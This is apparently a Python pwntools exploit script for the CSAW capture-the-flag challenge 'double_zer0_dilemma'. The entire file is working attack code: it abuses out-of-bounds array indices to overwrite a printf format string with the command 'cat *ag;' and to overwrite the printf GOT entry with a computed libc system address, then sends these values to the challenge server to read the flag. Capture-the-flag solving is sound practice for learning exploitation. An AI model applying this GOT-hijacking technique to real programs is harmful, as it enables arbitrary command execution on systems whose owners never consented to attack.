import pwn

string = int.from_bytes(b"cat *ag;", byteorder='little')
system_addr = 0x7ffff7e19290 + (0x7ffff7df4083 - 0x7ffff7deb083) #addr of my libc_system + (addr of __lib_start_main on server - addr of my __lib_start_main)
exit_msg = 0x808d080 #addr of printf string (exit_msg)
exit_msg_val = int.from_bytes(b"Your tot", byteorder='little') #val of exit_msg
GOT = 0x808d020 #GOT of printf
GOT_val = int.from_bytes(0x0000000000401040.to_bytes(8, 'little'), 'little') #val of printf GOT
bets = 0x808d0e0

index1 = (exit_msg - bets) // 8
value1 = string*2 - exit_msg_val

index2 = (GOT - bets) // 8
value2 = system_addr * 2 - GOT_val
 
#r = pwn.process("./double_zer0_dilemma")
r = pwn.process("nc double-zer0.csaw.io 9999", shell=True)

print("index1: " + str(index1))
print("value1: " + str(value1))
print("index2: " + str(index2))
print("value2: " + str(value2))

#send stuff
r.send(str(index1).encode('latin') + b"\n")
r.send(str(value1).encode('latin') + b"\n")
r.send(str(index2).encode('latin') + b"\n")
r.send(str(value2).encode('latin') + b"\n")

print(r.clean(2).decode('latin'))
